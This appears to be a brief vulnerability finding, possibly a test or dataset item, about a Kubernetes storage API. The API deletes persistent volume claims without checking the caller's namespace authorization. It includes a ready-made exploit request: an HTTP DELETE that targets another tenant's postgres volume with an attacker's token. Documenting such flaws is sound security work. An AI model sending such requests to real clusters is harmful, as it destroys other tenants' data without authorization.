diagnosis: The persistent volume claim (PVC) deletion route deletes storage resources in Kubernetes using the namespace and pvc_name path parameters. The endpoint authenticates current_user but performs no authorization checks on namespace. An attacker can delete persistent storage volumes and attached databases belonging to other tenants in the Kubernetes cluster, causing permanent data loss.
exploit_request:
DELETE /k8s/namespaces/tenant-analytics-db/storage/pvcs/postgres-data-pvc HTTP/1.1
Host: k8s-storage.cloud.io
Authorization: Bearer <attacker_jwt>
Accept: application/json
